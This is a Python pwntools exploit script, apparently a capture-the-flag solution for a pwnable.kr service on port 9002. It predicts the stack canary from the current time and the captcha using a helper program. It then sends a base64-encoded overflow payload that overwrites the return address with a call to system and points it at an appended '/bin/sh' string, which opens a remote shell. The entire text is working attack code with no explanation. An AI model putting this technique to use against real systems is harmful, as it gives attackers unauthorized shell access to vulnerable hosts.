import os
import time
from pwn import *

context(os='linux', arch='i386', log_level='debug')

p = remote('pwnable.kr', 9002)

p.recvuntil(' : ')
captcha = p.recvline().strip()
t = int(time.time())    # time.time() return float value

cookie = int('0x' + os.popen('./cal_stack_canary %s %s' %(t, captcha)).read().strip(), 16)

p.sendline(captcha)
p.recvuntil('me!\n')

call_system_addr = 0x8049187
g_buf_addr = 0x804b0e0

payload = 0x200 * 'a'
payload += p32(cookie)
payload += 12 * 'b'
payload += p32(call_system_addr)
payload += p32(g_buf_addr + 537*4/3)

payload = b64e(payload)
payload += '/bin/sh\x00'

p.sendline(payload)

p.interactive()
